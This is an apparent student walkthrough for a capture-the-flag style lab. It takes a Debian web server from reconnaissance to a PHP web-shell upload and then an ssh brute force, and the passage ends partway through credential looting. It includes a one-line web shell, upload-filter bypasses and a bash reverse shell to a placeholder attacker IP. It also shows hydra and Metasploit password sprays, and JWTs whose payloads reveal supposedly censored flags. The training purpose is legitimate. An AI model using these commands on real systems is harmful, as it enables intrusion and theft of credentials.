# overclock Web Server (OCWA): Student Walkthrough
### overclock Security | Offensive Track | Hands-On Lab

> **What this is.** The complete, in-depth walkthrough. For every objective you get the reasoning
> behind the move, the exact command, the real output, a breakdown of each switch, and the lesson.
> Flags stay censored, so you run the final decode yourself. If you would rather try each objective
> from a hint first and reveal these details only when stuck, use the **Hybrid** page, which folds
> this same walkthrough into collapsible panels.

**Target:** `192.168.148.100` (Debian web server) | **Attacker:** Kali Linux | **Related host:** the Server 2019 box (`192.168.148.101`) | **25 flags**

> **The golden rule.** This is the internet-facing entry point, and nothing is a free `grep`. The chain is
> **web -> web shell (www-data) -> ssh user (user1) -> root**, and each rung reuses what the last leaked.
> A plain `grep -r FLAG{` finds only **decoys**. Real flags are **JWTs** you decode (`eyJ…`), **base64**
> blobs (`RkxBR3t…`), rows in a **database** you query, an **API** you call, or **crypto** you crack.
> The creds you loot here **open the Windows server too.**

---

## Table of Contents
1. [How to read this guide](#how-to-read-this-guide)
2. [Initial Setup: preparing your Kali attack box](#initial-setup-preparing-your-kali-attack-box)
3. [Phase 1: Reconnaissance](#phase-1-reconnaissance)
4. [Phase 2: Web application attack](#phase-2-web-application-attack)
5. [Phase 3: Web shell foothold](#phase-3-web-shell-foothold)
6. [Phase 4: Lateral movement to ssh](#phase-4-lateral-movement-to-ssh)
7. [Phase 5: Looting the box (functional secrets)](#phase-5-looting-the-box-functional-secrets)
8. [Phase 6: Privilege escalation to root](#phase-6-privilege-escalation-to-root)
9. [Cross-host pivot](#cross-host-pivot)
10. [Flag checklist](#flag-checklist)

---

## How to read this guide
Every step shows the real command and output. Flags are **censored** (`FLAG{…}`), and JWTs and
base64 are shown truncated (`eyJ…`, `RkxBR3t…`) so you cannot copy the answer. Recover them yourself.
**The golden rule:** a plain `grep -r FLAG{` finds only **decoys**. Real flags are **base64 / JWT /
encrypted / in a database / behind a login**. Learn to spot `eyJ…` (a JWT), base64 blobs, and "the cred
is here, the flag is one hop away." Each flag also carries a **Command Breakdown** (what each switch
does) and a **Flag teaching** note (alternative tools and the real lesson).

---

## Initial Setup: preparing your Kali attack box
```bash
ip a
sudo apt update
sudo apt install -y nmap netexec hydra gobuster feroxbuster ffuf sqlmap \
                    curl jq openssl netcat-traditional john hashcat seclists python3-pip
sudo apt install -y burpsuite

# d3coder - lightweight one-file JWT/base64 decoder used all through the looting phase
# (https://github.com/0x31i/d3coder - pure python 3, no dependencies)
curl -sL https://raw.githubusercontent.com/0x31i/d3coder/main/d3coder -o /tmp/d3coder
sudo install -m 755 /tmp/d3coder /usr/local/bin/d3coder
```
| Tool | For |
|------|-----|
| **nmap** | port/service discovery |
| **curl / burpsuite** | web requests, source inspection, upload bypass |
| **gobuster/feroxbuster/ffuf** | content discovery on the web app |
| **hydra** | ssh brute-force (Phase 4) |
| **d3coder** | decode JWTs / base64 / session cookies (the looting phase): `d3coder <token>` |
| **jq / base64 / openssl** | JSON, base64, and cracking the encrypted flag |
| **netexec** (`nxc`) | testing looted creds across hosts (the cross-host pivot) |

**Decode a JWT** (you'll do this a lot — the payload is base64url JSON, readable without any key). Three ways, pick your comfort level:
```bash
d3coder '<token>'                                    # easiest: hand it the whole token; prints header + payload
echo '<token>' | cut -d. -f2 | basenc --base64url -d # by hand: basenc handles base64url (base64 -d does NOT)
python3 jwt_tool.py '<token>'                         # jwt_tool: the industry JWT multitool (also cracks/forges)
```
Or paste it into **jwt.io** for a quick read — **but never paste real client tokens/secrets into a third-party site;** `d3coder` and `jwt_tool` keep it offline. Whichever you use, read the `flag` claim (and note `sub` — whose token you hold).

**Verify reachability:**
```bash
curl -s -o /dev/null -w "%{http_code}\n" http://192.168.148.100/
```
**Expected output:**
```
302
```
(a 302 redirect to `login.php`).

---

## Phase 1: Reconnaissance

> **The thinking.** We are at the very front of the chain with no foothold, so this phase answers one
> question: what is actually exposed and how do we talk to it. A port scan is reconnaissance, not attack:
> each open port is a capability the box advertises, and naming the service behind it tells us how we will
> eventually turn access into a foothold. We fingerprint ports and versions first because everything
> downstream (which port to attack, what the banner leaks, whether the databases are even reachable)
> depends on knowing the surface before we touch it. The tradeoff is speed versus stealth, and in a lab we
> favor a fast, full read of the two open ports rather than a quiet one. This is the map that makes every
> later move deliberate instead of a guess.

**Goal.** Map the surface (a web app + ssh) and grab free intel.
**Try.** A service scan (`nmap -sV <target>`), and just *connect* to ssh without logging in. Only 22 and 80
are exposed; the databases and the internal API are localhost-bound (an internal-recon lesson for later).

**Why we do this.** You cannot attack what you cannot see, so before anything clever we turn a bare IP into
an inventory of services. A service scan tells us two things at once: which ports are open, and the exact
software and version answering on each, and "port 80 open" versus "Apache 2.4.x running the OverClock
portal" are very different amounts of intelligence. Here the scan surfaces only two doors, ssh (22) and http
(80), which immediately narrows the whole engagement: ssh wants a key or password we do not have yet, so the
web app on 80 is our only realistic way in. Just as important is what the scan does *not* show. Postgres,
MySQL, and an internal API are bound to localhost, so they are invisible from outside and we will only meet
them once we are on the box, which is itself a lesson: an external scan never reveals the full attack
surface.

**Command:**

```bash
nmap -Pn -sV -T4 192.168.148.100
```

**Expected output:**

```
22/tcp   open  ssh        OpenSSH 9.2p1 Debian
80/tcp   open  http       Apache httpd 2.4.x  (OverClock portal)
# Postgres/MySQL and an internal API bind to localhost only (you meet them after you get on the box)
```

**Reading the output.** Two exposed ports, and the http banner names the OverClock portal, so the web app is
where the chain begins. The commented note is the key foreshadowing: the databases and API are localhost-only,
so remember to re-enumerate the internal surface (`ss -ltn`) the moment you land a shell.

**Command breakdown**
- `-Pn` skip ping; `-sV` fingerprint versions; `-T4` faster timing.
- Only 22 and 80 are exposed; the databases and the internal API are localhost-bound (an internal-recon lesson for later).

**The lesson.** Reconnaissance defines the engagement: an attacker who skips it is guessing, one who does it
knows exactly which door to try. And a localhost-bound service is not a safe service, it is simply one you
meet after the perimeter falls, which is why defenders should never treat "internal only" as "unreachable."

### FLAG 1: SSH banner (Easy)

**Goal.** The ssh service is chatty before you authenticate. Read what it overshares.
**Try.** Connect to ssh without offering an auth method (`ssh -o PreferredAuthentications=none nobody@<target>`).
The **banner** prints a flag before it rejects you.

**Why we go after this.** An ssh login banner is text the server prints *before* it decides whether to let
you in, so it is one of the very few things an unauthenticated stranger can read for free. Administrators set
these banners for legal or informational reasons (a "welcome" or "authorized use only" notice), and in the
real world they routinely overshare: hostnames, environment ("prod" vs "staging"), a contact address,
sometimes even a maintenance note. We probe it because it costs no credential and its content is intelligence:
if the box is chatty here, it confirms we are on the right host and sets our expectation for how loose this
target is about disclosure. The trick is to *connect* without offering an authentication method, so the
server has to show us the banner and then reject us before any login is attempted. Here the banner literally
hands us a flag, which is the lab's way of teaching that pre-auth output is attack surface.

**Command:**

```bash
ssh -o PreferredAuthentications=none nobody@192.168.148.100
```

**Expected output:**

```
FLAG{…}
Welcome to OC Server
nobody@192.168.148.100: Permission denied (publickey,password).
```

**Reading the output.** The banner prints first, then `Permission denied` confirms we never actually
authenticated, we only read what the server volunteered. The username `nobody` is irrelevant; we chose it
because we do not intend to log in.

**Command breakdown**
- `-o PreferredAuthentications=none` offers no auth method, so the server prints its banner and rejects you; you never log in.
- Banners are free recon, no credential needed. `nc 192.168.148.100 22` and `nmap -p22 --script=banner` also grab it.

**Flag teaching.** You do not need `ssh` at all to read the banner: `nc 192.168.148.100 22` grabs it raw, and `nmap -p22 --script=banner 192.168.148.100` pulls it as part of a scan.

**The lesson.** Do not put anything sensitive in a pre-auth banner, because anyone on the network can read it
without a credential. As an attacker, always read banners and other pre-auth output first; it is the cheapest
recon there is.

**Flag 1 found:** `FLAG{D******7}`

---

## Phase 2: Web application attack

> **The thinking.** Port 80 is our only real way in since ssh wants a key or password we do not have yet,
> so the whole chain now hinges on defeating the web app. This phase answers whether the login portal can
> be turned into authenticated access, first by reading what the developers leaked, then by turning
> username enumeration and a discoverable password into a real session. We do the cheap, low-noise reads
> (source comments, differential errors) before anything heavier because they routinely hand you the
> credential for free. The discipline here is escalation of effort: read what the app volunteers before you
> reach for sqlmap or a brute-force, because a leaked comment or a chatty error message is faster, quieter,
> and often all you need.

**Goal.** Break the front door with source review + OSINT.
**Try.** Browse to `http://192.168.148.100/`; it redirects to `login.php` (the overclock portal). Read the
page source, use the leaked email/domain as an OSINT lead, and use the login form's differential errors to
enumerate a valid user, then log in.

![overclock login page](shots/ocwa_01_login.png)

### FLAG 2: Login page source (Easy)

**Goal.** Developers leave comments in the HTML. Read them.
**Try.** `curl -s .../login.php | grep -i "<!--"`. There is a flag in a comment, and an **email/domain**
(that is your OSINT lead for the next flag).

**Why we go after this.** An HTML comment is text the browser never renders but the server sends anyway, so
it is invisible on the page yet plainly readable in the raw source. Developers use comments as scratchpads:
"TODO fix this," a debugging note, a support email, occasionally a test credential, and they forget that
anything the server sends to the client is readable by the client, comment or not. That is why "view source"
is the very first thing a web attacker does: it is a free window into how the app was built and who built it.
We reason our way here because we have no credential and the login page is all the app will show us
unauthenticated, so we read everything it *does* show. The payoff is two-fold: a flag hides in a comment, and,
more importantly for the chain, the comments leak an email and company domain that become the OSINT seed for
the very next step.

**Command:**

```bash
curl -s http://192.168.148.100/login.php | grep -i "<!--"
```

**Expected output:**

```
<!-- Application developed by Eli AKA eli, the greatest security-focused developer ever in the world. -->
<!-- For support, reach out to: elias@chchcheckit.com -->
<!-- FLAG{…} -->
```

**Reading the output.** Three comments the page never displays. The flag is the obvious prize, but note the
`elias@chchcheckit.com` address and the `chchcheckit.com` domain, that leaked identity is the lead you feed
into OSINT to discover a working password in the next flag.

**Command breakdown**
- `curl -s` fetches quietly; `grep -i "<!--"` filters to HTML comments.
- Note the leaked email/domain (OSINT for the next flag). `view-source:` in a browser and Burp's response view show the same comments.

**Flag teaching.** No `curl` required if you prefer a GUI: `view-source:http://192.168.148.100/login.php` in a browser, or Burp's response view, shows the same hidden comments.

![login.php source: the hidden HTML comments leak the ALBUS flag plus the developer email and company domain](shots/ocwa_02_source_flag.png)

**The lesson.** Never ship secrets, credentials, or internal notes in client-side source, because everything
the server sends the browser is readable by anyone. As an attacker, always read the raw source first; the
cheapest wins on web apps hide in comments and leaked identifiers.

**Flag 2 found:** `FLAG{A******2}`

### FLAG 3: OSINT to authenticated homepage (Medium)

**Goal.** Turn the leaked domain into a live session, then read the homepage.
**Try.** The comment leaked a company domain; real assessors pivot to breach data / OSINT to find a
password. Here `brandon:sipsip1` is the discoverable account. The login form also leaks valid usernames via
**differential errors** ("password incorrect for user X" vs "user does not exist"). Log in and keep the
`PHPSESSID` cookie; the homepage shows the flag.

**Why we go after this.** A login form that says something *different* for a wrong password than for a
non-existent user is leaking information, and that difference is called a differential (or oracle) response.
It matters because it lets us split "does this account exist?" from "is this the right password?": we can
confirm valid usernames without ever guessing a password, which is username enumeration (an
information-disclosure finding in its own right). We reason our way here from the previous flag: the source
leaked an email and the `chchcheckit.com` domain, and a real assessor pivots that identity into breach-data
and OSINT lookups to recover a password, here the discoverable `brandon:sipsip1`. The value is the whole
point of this phase: turning "this account exists" plus a found password into a live, cookie-backed session
is what converts recon into credentialed access, and that session is where we go looking for the file-upload
feature that becomes our shell. The `PHPSESSID` cookie *is* our identity once we log in, so we save it and
reuse it.

**Recover the password from breach data (the OSINT pivot).** We have no password yet, only the leaked identity `elias@chchcheckit.com` and the `chchcheckit.com` domain from Flag 2. The move a real assessor makes is to run that domain against historical data breaches: people reuse passwords across sites for years, so a credential that leaked in some unrelated breach is very often still valid on the target. `breach-parse` (Heath Adams' tool) does exactly that, searching a local copy of the COMB compilation (the "Compilation of Many Breaches", a ~41GB aggregate of public dumps) for every `email:password` pair on a domain. Install it on Kali if it is not already there, then search the domain:

```bash
# one-time install of breach-parse on the attacker box
sudo git clone https://github.com/hmaverickadams/breach-parse.git /opt/breach-parse
cd /opt/breach-parse
# breach-parse searches a local breach set (point it at your COMB copy; this lab
# provides a trimmed set containing the target domain). Search the leaked domain:
./breach-parse.sh @chchcheckit.com results
cat results-master.txt
```

**Expected output:**

```
[*] Searching for emails @chchcheckit.com
[*] Searching through 41GB of breach data...
[+] Found 3 results
brandon@chchcheckit.com:sipsip1
elias@chchcheckit.com:sipsip1
elias@chchcheckit.com:sipsip123
```

`brandon@chchcheckit.com:sipsip1` is the line that matters: `brandon` is a real (hidden) portal account and `sipsip1` is the password that leaked alongside it. That one line is the whole payoff of the pivot, a working password we never had to guess. On a real engagement `breach-parse` is only one route, and you would usually try several:

```bash
# a local leaked-credentials corpus, grepped directly
grep -rl "chchcheckit.com" /usr/share/seclists/Passwords/Leaked-Databases/
# online breach services (mind client-data handling rules):
#   haveibeenpwned.com   which breaches a domain appears in
#   dehashed.com / intelx.io   the actual credential pairs
# google dorking for pasted dumps:
#   site:pastebin.com "chchcheckit.com"
#   filetype:txt "chchcheckit.com" password
```

**Why this works.** That password was never on the target; it came from an unrelated breach years earlier and still works because the owner reused it. That is credential reuse, and it is why breach-data OSINT is one of the highest-yield opening moves in a real assessment: no noisy brute force, no exploit, just a public leak plus a person who never rotated their password.

**Log in with it — through the browser (the realistic path).** You have a real user's password now, so this is a *login, not a brute-force*. Point your browser at `http://192.168.148.100/login.php`, enter `brandon` / `sipsip1`, and submit. The form carries the anti-CSRF `user_token` for you, sets your session cookie, and drops you on `homepage.php` — where the flag is printed:

```
FLAG{…}
```

![the login form leaks a different error for a real account: "The password for 'brandon' was incorrect" confirms brandon exists](shots/ocwa_03_login_enum.png)

**Username enumeration falls out of the same form:** a wrong password for a *real* user shows "The password for 'brandon' was incorrect"; a *non-existent* user shows no such line at all. Presence-vs-absence is the enumeration oracle — you can watch it happen right in the browser.

**Or script it** (for repeatability / your report). The terminal version only looks busier because now *you* have to fetch the `user_token` the browser form carried for you — scrape it, POST with it, reuse one cookie jar:

```bash
tok=$(curl -s -c cj http://192.168.148.100/login.php | grep -oP "user_token' value='\K[^']+")
curl -s -b cj -c cj -d "username=brandon&password=sipsip1&Login=Login&user_token=$tok" http://192.168.148.100/login.php >/dev/null
curl -s -b cj http://192.168.148.100/homepage.php | grep -oE 'FLAG\{[A-Za-z0-9_]+\}'   # -> FLAG{…}
```

> **Would you brute-force this?** Only if you *didn't* have a password — here you do, so you just log in. If you were actually attacking a **CSRF-protected form**, the pro move is **Burp Suite Intruder** with a session-handling macro that re-reads `user_token` before each request; **Hydra**'s `http-post-form` handles simpler forms. (Service logins like the SSH phase next are where **Hydra** and **Metasploit** shine.)

**Reading the output.** After logging in, `homepage.php` renders only because the request carried our session cookie — the cookie *is* your identity once you log in, and the flag is right there on the authenticated home page.

![the authenticated Overclock homepage for the hidden brandon user: "Special Access Detected" reveals the DOBBY flag](shots/ocwa_04_dashboard.png)

**Command breakdown**
- `-c cj` saves cookies (your session) to a file; `-b cj` sends them on the next request so the homepage treats you as logged in.
- Username enumeration via differing error messages is itself an information-disclosure finding; `ffuf` / Burp Intruder automate confirming valid users.

**Flag teaching.** You do not have to test usernames by hand: `ffuf` or Burp Intruder will spray a username list at the form and flag which ones return the "password incorrect" oracle instead of "user does not exist."

**The lesson.** Login forms should return one generic error ("invalid username or password") so they never
confirm which half was wrong. Password reuse and guessable passwords tied to a leaked identity are how OSINT
becomes access, which is why breach-data exposure of a single employee credential is a real corporate risk.

**Flag 3 found:** `FLAG{D******5}`

---

## Phase 3: Web shell foothold

> **The thinking.** An authenticated session lets us browse the app but not run commands, so the next rung
> is trading web access for code execution on the server. This phase answers whether the upload feature can
> be abused to plant a PHP shell, which is the difference between poking at pages and owning a process on
> the box. We accept that the shell only gets us www-data, a deliberately weak account, because code
> execution as anyone is the beachhead everything else is built on. Everything from here (looting secrets,
> brute-forcing to a real user, escalating to root) requires this single toehold, so getting *any* command
> to run on the server is the pivot that changes the entire character of the engagement.

**Goal.** Turn the web app into code execution.
**Try.** The **file-upload** feature is not picky. Upload a small PHP web shell (bypass the image filter with
a Content-Type trick in Burp, a double extension, or a magic-byte polyglot). Trigger it with
`curl ".../shell.php?cmd=id"`. Expect `uid=33(www-data)`, then upgrade to a reverse shell.

**Why we do this.** A file-upload feature exists to accept documents or images, but if it does not strictly
validate what it stores *and* saves the file somewhere the web server will execute, it becomes a remote code
execution primitive. A PHP web shell is the simplest expression of that: a one-line script that takes a
`cmd` parameter and hands it to `system()`, so every request runs whatever command we pass. We reach for this
now because our authenticated session can reach the upload form but nothing on the app lets us run commands,
and code execution is the only thing that moves us from "web user" to "process on the box." The realistic
condition that makes it work is a weak or bypassable filter: apps check the file extension or the
`Content-Type` header, both of which the client controls, so a `Content-Type: image/jpeg` swap, a double
extension like `.php.jpg`, or a `GIF89a` magic-byte polyglot slips PHP past an image-only filter. The shell
only earns us www-data, a deliberately weak service account, but that is fine: any code execution is the
beachhead the rest of the chain builds on.

Upload a PHP web shell, then run a command. **You learn the stored path from the upload response**, the app
tells you where the file landed, you don't assume `/hackable/uploads/`:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# upload form: http://192.168.148.100/vulnerabilities/upload/
# either upload via the app (intercept in Burp, set Content-Type: image/jpeg if the filter complains),
# or upload directly with curl using the authenticated cookie jar (cj) from the login step:
curl -s -b cj -F "uploaded=@shell.php;type=image/jpeg" -F "Upload=Upload" "http://192.168.148.100/vulnerabilities/upload/"
# the app returns the stored path, typically ../../hackable/uploads/shell.php
```

![the reskinned file-upload feature ("Profile Settings", flagged as buggy) accepts a PHP web shell](shots/ocwa_05_upload.png)

**Upload response (this is the discovery, it prints the path):**

```
../../hackable/uploads/shell.php succesfully uploaded!
```

![the app confirms the upload and hands you the stored path: ../../hackable/uploads/shell.php succesfully uploaded!](shots/ocwa_06_upload_success.png)

Now trigger it at the path the app just handed you:

```bash
curl "http://192.168.148.100/hackable/uploads/shell.php?cmd=id"
```

**Expected output:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![browsing to the uploaded shell with ?cmd=id runs code as the web server: uid=33(www-data) on OCWA-debian](shots/ocwa_07_webshell_rce.png)

Upgrade to a proper reverse shell:

```bash
# on Kali:  nc -lvnp 4444
curl "http://192.168.148.100/hackable/uploads/shell.php?cmd=$(python3 -c 'import urllib.parse;print(urllib.parse.quote("bash -c \"bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1\""))')"
```

**Reading the output.** `uid=33(www-data)` is the web server's own service account: we are now running
commands as the Apache worker process. That is the beachhead, but www-data is intentionally powerless (it
owns the web root and little else), which is why the next phase works to become a real user.

**Command breakdown**
- The `?cmd=id` query is passed straight to `system()` by the shell, so the server runs `id` and returns it. You now have code execution as **www-data**.
- The three classic upload bypasses are a Content-Type change (`image/jpeg`) in Burp, a double extension (`shell.php.jpg` / `.phtml`), and a magic-byte polyglot (`GIF89a<?php ...`).

**Flag teaching.** If the image filter blocks a plain `.php`, reach for one of the three classic bypasses: a Content-Type change to `image/jpeg` in Burp, a double extension (`shell.php.jpg` / `.phtml`), or a magic-byte polyglot (a file that starts `GIF89a<?php ...`).

**The lesson.** An upload feature must validate content, not the client-supplied extension or Content-Type,
and must store uploads outside any web-executable directory. Server-side code execution as even a low-value
account is a full compromise waiting to happen, because from a shell you can enumerate, loot, and escalate.

---

## Phase 4: Lateral movement to ssh

> **The thinking.** www-data is a shared, low-privilege account that cannot read most secrets and gets you
> noticed, so the question now is how to become a real interactive user. The web app already handed us
> valid usernames and the box advertises weak passwords, so a small, throttled ssh brute is the cheapest
> way to trade code execution for a proper login. We keep the thread count low on purpose because the lab
> locks you out if you hammer it, and a clean shell as a real user is worth the extra patience.

**Goal.** Upgrade `www-data` to a real user.
**Try.** **Brute-force ssh** with `hydra` and a small wordlist (`-t 4` so the lab does not drop you). You
will land a real user (`user1`), your foothold. `ssh` in.

**Why we do this.** www-data is a shared service account: it runs the web server, so it is loud (its actions
are logged as the app), it is sandboxed away from user home directories and secrets, and it is not a login we
can `ssh` back into cleanly. A *real* interactive user has a home directory, a shell history, config files,
and often group memberships and sudo rights, which is exactly the material the looting phase feeds on. So we
want to trade code-execution-as-www-data for a proper login. Brute-forcing ssh is the cheap way to do that
here because the web app already handed us valid usernames (enumeration in Phase 2) and the lab advertises
weak passwords, so we are testing a short, targeted credential list rather than blindly hammering. The
critical operational detail is throttling: too many parallel threads and the lab (like a real fail2ban or
account-lockout policy) drops or bans you, burning the very access you are trying to earn. We keep it
low-and-slow at four threads because a clean shell as `user1` is worth the patience.

```bash
printf 'user1\nadmin\ndeveloper\nbackup\n' > users.txt
printf 'password123\nPassword1\nadmin\nletmein\nwelcome\n' > passwords.txt
hydra -L users.txt -P passwords.txt ssh://192.168.148.100 -t 4 -V
```

**Expected output:**

```
[22][ssh] host: 192.168.148.100   login: user1   password: password123
1 of 1 target successfully completed, 1 valid password found
```

Prefer **Metasploit**? The `ssh_login` module does the same spray and even opens a session on a hit:

```bash
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; \
  set RHOSTS 192.168.148.100; set USER_FILE users.txt; set PASS_FILE passwords.txt; \
  set STOP_ON_SUCCESS true; set BRUTEFORCE_SPEED 2; run; exit"
```
```
[+] 192.168.148.100:22 - Success: 'user1:password123' 'uid=1001(user1) groups=1001(user1),109(docker) …'
[*] SSH session 1 opened
```

Then drop into a normal interactive shell as the user:

```bash
ssh user1@192.168.148.100
```

**Reading the output.** Hydra found `user1:password123`, a real interactive account. Note the password is a
classic weak one, the same reused-credential theme that runs through the whole lab, and `user1` is the
foothold every remaining flag is looted from.

**Command breakdown**
- `-L users.txt` / `-P passwords.txt` are the username/password lists; `-t 4` throttles to 4 threads (the lab drops you if you over-thread); `-V` shows each attempt.
- `www-data -> real user -> root` is the standard Linux ladder. Medusa and the Metasploit `ssh_login` module are alternatives to hydra.

**Flag teaching.** Hydra is not the only brute-forcer: Medusa and the Metasploit `ssh_login` module do the same job, and any of them will find `user1:password123` against this small list.

**The lesson.** Weak, guessable passwords on ssh-reachable accounts fall to a small wordlist in seconds; this
is why key-based auth, strong passwords, rate-limiting (fail2ban), and lockout policies exist. As the
attacker, throttle your brute-force so you stay under those defenses instead of tripping them.

---

## Phase 5: Looting the box (functional secrets)

> **The thinking.** Now that we have a real user shell we systematically sweep the box, because the middle
> of the chain is where reused creds, tokens, and keys accumulate. This phase answers where the functional
> loot lives and, just as important, teaches the reflex that a plain grep only finds decoys: the real flags
> sit inside JWTs, databases, an internal API, encrypted blobs, and archives. We do this before escalating
> because much of what we harvest here (the cross-host Windows creds, an ssh key to another account, service
> keys) is what makes the later steps and the pivot possible.

The flags are **functional loot**, not plaintext tokens. As `user1`, sweep the box.

**JWT flags.** Check your own `~/.bash_history`, plus `~/.git-credentials`, `~/.netrc`, the logs
(`/var/log/oc.log`, `/var/log/webapp/app.log`), a "legacy passwords" backup, `/tmp/.hidden/`, and a service
`.env`. Grep for `eyJ…`, decode the payload, and read the `flag` claim. Ignore the obvious `FLAG{DECOY}` strings. (Note `jq` isn't installed on this box, so decode with `d3coder`, not `jq -r .flag`.)

**Why we go after this.** A JWT (JSON Web Token) is a compact credential made of three base64url segments
separated by dots: a header, a payload of "claims" (arbitrary JSON), and a signature. The single most
important fact for us is that the payload is only *encoded*, not encrypted: the signature proves the token was
not tampered with, but it does nothing to hide the contents, so anyone holding the token can base64-decode the
middle segment and read every claim in plaintext. Attackers hunt JWTs because they are bearer tokens (whoever
holds one is authenticated as its subject) and because that readable payload often leaks emails, roles, and
internal identifiers. They end up scattered across a box for very human reasons: an app logs a token for
debugging, a developer pastes one into `~/.bash_history` while testing `curl`, credential helpers cache them
in `~/.git-credentials` and `~/.netrc`, and a service writes one into its `.env`. So we reason: we now have a
real user's shell, so we sweep exactly those history, config, and log locations for `eyJ` (the tell that a
base64 blob starts with `{"`), decode the payload, and read the `flag` claim, which also lets us tell the
real tokens apart from the planted `FLAG{DECOY_*}` strings sitting in obvious grep spots.

### Why grep is the right call here

Grep isn't a shortcut in this phase, it's the correct tool, and knowing when it's correct is half the lesson. The habit worth building is simple: use content-search when you know the shape of what you want but not where it lives. You're not after a filename or a fixed path. You're after a type of credential that has a distinctive, machine-readable signature. Every JWT starts with the three letters `eyJ`, because a JWT always opens with a header object `{"alg":...}` and `{"` base64url-encodes to `eyJ`. That's about as close to a fingerprint as you get. When your target has a fingerprint and could be sitting anywhere, sweeping the tree for that fingerprint is what grep does best.

This is also where skill separates from laziness. The lazy version is `grep -r 'FLAG{'`. It only turns up the plaintext decoys the box scatters in obvious spots, because a real credential is never lying around as `FLAG{...}`. The useful version searches for the structure of the credential itself, the `eyJ` prefix, which lands you on the working tokens the box actually rewards. Same tool either way. The whole difference is in what you decided to search for.

Now, why these directories and not others. Each one is on the list for a concrete reason a token tends to end up there. This is a model of where credentials pool on a live box, not a path list to memorize: `~` holds shell history and helper caches (`.git-credentials`, `.netrc`) that store tokens in plaintext by design; `/var/log` is where apps and auth daemons log what they do, values and all; `/opt` is where this app is installed, so its configs and `.env` files live there; `/tmp` is scratch space and cheap persistence; `/var/backups` holds secrets that were meant to be rotated and never were; `/etc` holds system config and unit files.

The sweep:

```bash
grep -rIlE 'eyJ[A-Za-z0-9._-]+' ~ /var/log /opt /tmp /var/backups /etc 2>/dev/null
```

The flags are chosen deliberately, not by habit. `-r` recurses, since you don't know how deep the token sits. `-I` skips binary files, which throw random byte runs that produce fake `eyJ` hits, and you're after text leaks anyway. `-l` prints filenames only, not matching lines, because you want the map first: dumping every hit from a multi-megabyte log buries you, so you list the locations and then open each one on purpose. That's how you'd work a real box, breadth first and depth second. `-E` gives extended regex so the character class works without escaping.

**Output:**

```
/home/user1/.netrc
/home/user1/.git-credentials
/home/user1/.bash_history
/var/log/webapp/app.log
/var/log/oc.log
/opt/oc/configs/service.env
/tmp/.hidden/secret.txt
/var/backups/system/old_passwords.txt
/etc/ssh/ssh_host_rsa_key                     (not a flag: an RSA host key)
/etc/ssl/certs/ca-certificates.crt            (not a flag: the CA bundle)
/etc/systemd/system/oc-hidden-flag.service    (same token as Flag 9; the unit re-drops it)
```

Enumeration built that list, you didn't guess it. But look at the last few hits. A host key and the CA bundle are base64-heavy and technically matched, and neither is a JWT. Because you know your target's shape (`eyJ`, three dot-separated segments), you throw the look-alikes out at a glance. A grep hands you candidates; you decide which are real, and that call is the thing a scanner can't make for you.

**The decoder.** A JWT is three base64url segments: header, payload, signature. The part that matters to an attacker is that the payload is only encoded, never encrypted. The signature proves nobody tampered with the token, but it does nothing to hide the contents, so anyone holding it can read every claim. That's why a leaked JWT hurts, and why you need no key to read one.

You've *spotted* a token; now copy it and decode it — no grep-into-a-variable, you work with the string itself, the way a real assessor does. One thing to know: a JWT uses **base64url** (`-` and `_` instead of `+` and `/`), so plain `base64 -d` chokes on it. Three ways, pick your comfort level:

```bash
# 1) d3coder - the lab's one-file decoder (installed in Initial Setup); hand it the whole token
d3coder '<token>'

# 2) by hand, nothing installed - basenc understands base64url (base64 -d does not)
echo '<token>' | cut -d. -f2 | basenc --base64url -d

# 3) jwt_tool - the industry JWT multitool (also cracks/forges)
python3 jwt_tool.py '<token>'
```

Or paste it into **jwt.io** and read the payload panel — fastest for a single token, **but in a real client engagement never paste live client tokens or secrets into a third-party website** (`d3coder` and `jwt_tool` keep it offline; for lab tokens jwt.io is fine). The `sub` (subject) claim tells you whose token you're holding — often worth more than the flag, since it's what you'd replay against the next service.

![Decoding a JWT with d3coder — the payload's flag claim is right there; the by-hand and jwt_tool methods agree](shots/jwt_d3coder_decode_censored.png)

Now take each hit on its own terms. Work out why a token would be there, then make the move.

#### Flag 4: a bearer token cached by the git credential helper

When someone runs `git push` over HTTPS to a private remote, git's `store` helper writes the credential to `~/.git-credentials` in plaintext, on purpose, so the user isn't prompted every time. You check this file early because credential helpers are a known, standard cache: if the box ever talked to an internal git remote, the credential is right here. The wrinkle worth teaching is that the "password" half of the URL is more and more often a bearer token rather than a password.

```bash
cat ~/.git-credentials
```
```
https://ci-bot:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjaS1ib3Qi...@git.internal.oc
```

The URL is `https://<user>:<secret>@<host>`, so the token is the `<secret>`, and the host (`git.internal.oc`) even names the internal service it authenticates to.

```bash
d3coder 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjaS1ib3QiLCJpYXQiOjE3MTAwMDAwMDAsInNjb3BlIjoiaW50ZXJuYWwiLCJmbGFnIjoiRkxBR3tIQUdSSUQ0NjcwMzI3NX0ifQ.bvUhe_YSp57SPRh-GIs4T0andHwXI5C2L63hpK0T1b8'
```
```
{"sub":"ci-bot","iat":1710000000,"scope":"internal","flag":"FLAG{H******5}"}
```

`sub` is **ci-bot**, a CI service account, exactly the identity an automated `git push` would leave cached here. You're now holding a CI bot's internal-scoped token. **Flag 4: `FLAG{H******5}`**

#### Flag 5: an API "password" in `.netrc` that's actually a JWT

`~/.netrc` exists so non-interactive tools (`curl`, `git`, `ftp`) can log in without prompting. It stores `machine / login / password` in plaintext, with no encryption option in the format. So catting `.netrc` is one of the first things you do on a new shell, because it's one of the highest-signal single files on the box. The twist here is that the `password` field isn't a password at all, a good reminder not to trust a field's name over its contents.

```bash
cat ~/.netrc
```
```
machine api.oc.internal
login user1
password eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSIs...
```
```bash
d3coder 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSIsImlhdCI6MTcxMDAwMDAwMCwic2NvcGUiOiJpbnRlcm5hbCIsImZsYWciOiJGTEFHe01PT0RZNTAyNTg2NjF9In0.Z2J5wizgld5q_D6-p2731T8gQ_WHsJST-air3YmOdpA'
```
```
{"sub":"user1","iat":1710000000,"scope":"internal","flag":"FLAG{M******1}"}
```

